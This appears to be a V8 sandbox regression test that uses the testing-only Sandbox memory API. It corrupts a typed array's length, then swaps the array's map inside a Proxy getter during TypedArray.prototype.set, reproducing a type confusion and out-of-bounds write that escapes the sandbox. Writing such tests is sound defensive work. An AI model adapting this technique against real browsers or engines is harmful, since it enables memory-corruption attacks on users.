// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

const kTAType = Sandbox.getInstanceTypeIdFor('JS_TYPED_ARRAY_TYPE');
const kByteLenOff = Sandbox.getFieldOffset(kTAType, 'byte_length');
const kByteOffOff = Sandbox.getFieldOffset(kTAType, 'byte_offset');

const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const r32 = (a) => mem.getUint32(a, true);
const w32 = (a, v) => mem.setUint32(a, v >>> 0, true);
const w64 = (a, v) => mem.setBigUint64(a, v, true);

const mapU8  = r32(Sandbox.getAddressOf(new Uint8Array(1)));
const mapF64 = r32(Sandbox.getAddressOf(new Float64Array(1)));

const target = new Uint8Array(new SharedArrayBuffer(1024));
const addr = Sandbox.getAddressOf(target);

w64(addr + kByteLenOff, 0xffffffffffffffffn);
w64(addr + kByteOffOff, 0n);

target.set(new Proxy({}, {
  get(_, p) {
    if (p === 'length') { w32(addr, mapF64); return 1; }
    if (p === '0')      { w32(addr, mapU8);  return 42; }
  }
}), 32_000_000_000);
